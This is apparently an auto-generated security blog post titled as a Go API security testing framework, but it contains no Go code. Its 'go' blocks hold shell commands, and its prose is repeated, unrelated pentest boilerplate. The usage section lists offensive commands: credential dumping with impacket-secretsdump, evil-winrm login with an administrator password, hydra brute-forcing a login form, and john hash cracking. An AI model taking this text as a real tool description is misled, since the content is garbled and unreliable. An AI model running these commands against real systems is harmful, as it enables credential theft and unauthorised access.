---
TitleSEO: "API Security Testing Framework in Go | ZureFX"
TitlePost: "API Security Testing Framework — Go"
Author: "ZureFX"
Description: "A Go script for api security testing framework. Built for security research and automation."
Keywords: "c, scanner, script, python, go, bash"
URL: "https://zurefx.github.io/scripting/script-api-security-testing-framework-924.html"
URL_IMAGES: ""
Date: "2024-09-11"
Tags: "C, Scanner, Script, Python, Go, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-api-security-testing-framework-924"
Permalink: "/scripting/script-api-security-testing-framework-924.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `socat`
- `hydra`
- `nikto`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.85.74.52/FUZZ
nmap -sCV -p80,110,8443 10.112.254.204 -oN scan.txt
gobuster dir -u http://10.32.96.135/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.118.86.171/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.10.97
evil-winrm -i 10.110.30.154 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.90.147.198 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 5.23s
```
